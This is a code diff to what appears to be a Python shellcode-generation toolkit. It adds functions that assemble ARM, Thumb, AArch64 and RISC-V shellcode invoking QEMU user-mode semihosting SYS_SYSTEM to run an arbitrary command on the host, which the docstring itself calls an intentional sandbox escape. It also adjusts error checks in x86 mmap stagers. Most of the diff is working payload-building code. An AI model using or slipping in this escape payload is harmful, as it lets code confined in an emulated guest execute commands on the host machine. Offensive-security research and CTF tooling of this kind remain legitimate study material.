@@ -47,6 +47,14 @@ class _OrwStack:
     frame_size: int
 
 
+@dataclass(frozen=True, slots=True)
+class _QemuSemihostingStack:
+    data: bytes
+    command_offset: int
+    arguments_offset: int
+    frame_size: int
+
+
 def _append_cstring(image: bytearray, value: bytes, alignment: int) -> int:
     offset = _align(len(image), alignment)
     image.extend(b"\0" * (offset - len(image)))
@@ -93,6 +101,31 @@ def _orw_stack(target: Target, path: str | bytes, max_bytes: int) -> _OrwStack:
         raise ValueError(f"ORW stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
     image.extend(b"\0" * (buffer_offset - len(image)))
     return _OrwStack(bytes(image), path_offset, buffer_offset, max_bytes, frame_size)
+
+
+def _qemu_semihosting_stack(target: Target, command: str | bytes) -> _QemuSemihostingStack:
+    encoded = command.encode() if isinstance(command, str) else bytes(command)
+    if not encoded:
+        raise ValueError("command cannot be empty")
+    if b"\0" in encoded:
+        raise ValueError("command cannot contain a NUL byte")
+
+    image = bytearray()
+    command_offset = _append_cstring(image, encoded, target.word_size)
+    arguments_offset = _align(len(image), target.word_size)
+    image.extend(b"\0" * (arguments_offset - len(image)))
+    image.extend(target.pack(0))
+    image.extend(target.pack(len(encoded)))
+    frame_size = _align(len(image), target.convention.stack_alignment)
+    image.extend(b"\0" * (frame_size - len(image)))
+    if frame_size > _MAX_STACK_IMAGE:
+        raise ValueError(f"QEMU semihosting command stack image is {frame_size} bytes; maximum is {_MAX_STACK_IMAGE}")
+    return _QemuSemihostingStack(
+        bytes(image),
+        command_offset,
+        arguments_offset,
+        frame_size,
+    )
 
 
 def _word_chunks(target: Target, data: bytes) -> list[tuple[int, int]]:
@@ -871,6 +904,155 @@ def _arm_load(register: str, value: int) -> list[str]:
     return [f"movw {register}, #{value & 0xFFFF}", f"movt {register}, #{value >> 16}"]
 
 
+def _arm_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
+    suffix = ".w" if target.arch is Architecture.THUMB else ""
+    lines = _arm_load("r3", stack.frame_size)
+    lines.append(f"sub{suffix} sp, sp, r3")
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(
+            (
+                f"movw r12, #{value & 0xFFFF}",
+                f"movt r12, #{value >> 16}",
+                f"str{suffix} r12, [sp, #{offset}]",
+            )
+        )
+    lines.extend(
+        (
+            f"add{suffix} r2, sp, #{stack.command_offset}",
+            f"str{suffix} r2, [sp, #{stack.arguments_offset}]",
+            "movw r0, #0x12",
+        )
+    )
+    lines.extend(_arm_load("r1", stack.arguments_offset))
+    lines.extend(
+        (
+            f"add{suffix} r1, sp, r1",
+            "svc #0xab" if target.arch is Architecture.THUMB else "svc #0x123456",
+            "eor r0, r0, r0",
+            "movw r7, #1",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _aarch64_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
+    lines = [f"sub sp, sp, #{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend(_aarch64_load("x9", value))
+        lines.append(f"str x9, [sp, #{offset}]")
+    lines.extend(
+        (
+            f"add x9, sp, #{stack.command_offset}",
+            f"str x9, [sp, #{stack.arguments_offset}]",
+            "mov x0, #0x12",
+            f"add x1, sp, #{stack.arguments_offset}",
+            "hlt #0xf000",
+            "mov x0, xzr",
+            "mov x8, #93",
+            "svc #0",
+        )
+    )
+    return lines
+
+
+def _riscv_qemu_semihosting(target: Target, stack: _QemuSemihostingStack) -> list[str]:
+    store = "sd" if target.arch is Architecture.RISCV64 else "sw"
+    lines = [f"addi sp, sp, -{stack.frame_size}"]
+    for offset, value in _word_chunks(target, stack.data):
+        lines.extend((f"li t0, 0x{value:x}", f"{store} t0, {offset}(sp)"))
+    lines.extend(
+        (
+            f"addi t1, sp, {stack.command_offset}",
+            f"{store} t1, {stack.arguments_offset}(sp)",
+            "li a0, 0x12",
+            f"addi a1, sp, {stack.arguments_offset}",
+            ".balign 16",
+            "slli zero, zero, 0x1f",
+            "ebreak",
+            "srai zero, zero, 0x7",
+            "li a0, 0",
+            "li a7, 93",
+            "ecall",
+        )
+    )
+    return lines
+
+
+def qemu_semihosting_command_source(command: str | bytes, target: Target) -> tuple[str, int]:
+    """Lower a host ``SYS_SYSTEM`` escape for automatic QEMU user-mode semihosting."""
+
+    supported = {
+        Architecture.ARM,
+        Architecture.THUMB,
+        Architecture.ARM64,
+        Architecture.RISCV32,
+        Architecture.RISCV64,
+    }
+    if target.arch not in supported:
+        raise UnsupportedTargetError(f"automatic QEMU user-mode semihosting is not implemented for {target.name}")
+
+    stack = _qemu_semihosting_stack(target, command)
+    lines = _header(target)
+    if target.arch in {Architecture.ARM, Architecture.THUMB}:
+        lines.extend(_arm_qemu_semihosting(target, stack))
+    elif target.arch is Architecture.ARM64:
+        lines.extend(_aarch64_qemu_semihosting(target, stack))
+    else:
+        lines.extend(_riscv_qemu_semihosting(target, stack))
+    return "\n".join(lines) + "\n", stack.frame_size
+
+
+def qemu_semihosting_command_shellcode(
+    command: str | bytes,
+    target: Target,
+    *,
+    assembler: LLVMAssembler | None = None,
+) -> Payload:
+    """Build shellcode that runs a command on the QEMU user-mode host.
+
+    Supported qemu-user targets intercept the architecture's semihosting trap
+    automatically.  Consequently this is an intentional sandbox escape, not a
+    guest Linux command payload.  The command must be trusted.
+    """
+
+    source, stack_size = qemu_semihosting_command_source(command, target)
+    data = (assembler or LLVMAssembler()).assemble(source, target)
+    code_alignment = 16 if target.arch in {Architecture.RISCV32, Architecture.RISCV64} else 4
+    return Payload(
+        data=data,
+        target=target,
+        kind=PayloadKind.SHELLCODE,
+        description="QEMU user-mode semihosting SYS_SYSTEM host-command escape",
+        memory=(
+            MemoryRequirement(
+                len(data),
+                Permission.READ | Permission.EXECUTE,
+                "semihosting shellcode bytes",
+                alignment=code_alignment,
+            ),
+            MemoryRequirement(
+                stack_size,
+                Permission.READ | Permission.WRITE,
+                "temporary semihosting command and argument block",
+                alignment=target.convention.stack_alignment,
+            ),
+        ),
+        data_requirement_index=0,
+        metadata={
+            "operation": "qemu-user-semihosting-system",
+            "semihosting_call": "SYS_SYSTEM",
+            "semihosting_operation_number": 0x12,
+            "command_executes_on_host": True,
+            "qemu_user_automatic_interception": True,
+            "trusted_command_required": True,
+            "position_independent": True,
+            "requires_instruction_cache_sync_after_runtime_write": _requires_instruction_cache_sync(target),
+            "assembly": source,
+        },
+    )
+
+
 def _x86_stager(target: Target, size: int, map_size: int, input_fd: int) -> list[str]:
     if target.arch is Architecture.X86_64:
         return [
@@ -882,8 +1064,8 @@ def _x86_stager(target: Target, size: int, map_size: int, input_fd: int) -> list
             "xor r9d, r9d",
             "mov eax, 9",
             "syscall",
-            "test rax, rax",
-            "js .Lstage_fail",
+            "cmp rax, -4095",
+            "jae .Lstage_fail",
             "mov r12, rax",
             "mov r13, rax",
             f"mov r14, {size}",
@@ -920,8 +1102,8 @@ def _x86_stager(target: Target, size: int, map_size: int, input_fd: int) -> list
         "xor ebp, ebp",
         "mov eax, 192",
         "int 0x80",
-        "test eax, eax",
-        "js .Lstage_fail",
+        "cmp eax, 0xfffff001",
+        "jae .Lstage_fail",
         "mov esi, eax",
         "mov edi, eax",
         f"mov ebp, {size}",
@@ -1630,4 +1812,6 @@ __all__ = [
     "mmap_stager_source",
     "orw_shellcode",
     "orw_source",
+    "qemu_semihosting_command_shellcode",
+    "qemu_semihosting_command_source",
 ]
